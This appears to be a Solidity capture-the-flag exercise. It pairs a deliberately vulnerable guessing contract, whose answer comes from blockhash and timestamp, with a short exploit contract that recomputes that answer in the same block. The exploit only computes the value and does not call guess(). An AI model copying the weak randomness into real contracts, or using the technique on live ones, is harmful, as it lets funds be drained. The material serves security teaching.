// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract GuessNewNumber {
    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable returns (bool pass) {
        require(msg.value == 1 ether);
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));

        if (n == answer) {
            (bool ok,) = msg.sender.call{value: 2 ether}("");
            require(ok, "Fail to send to msg.sender");
            pass = true;
        }
    }
}

//Write your exploit codes below
contract ExploitContract {
    GuessNewNumber public guessNewNumber;
    uint8 public answer;

    //Exploitable when n (0 to 255 inclusive) == answer, answer is also downcasted to uint8.
    //Answer is uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))),
    //which means answer will be the value of the most insignificant byte (1 byte) of the 32 byte hash.

    function Exploit() public returns (uint8) {
        //if this gets called in the same block number and timestamp as `guess`, then the answers will be the same
        answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        return answer;
    }
}
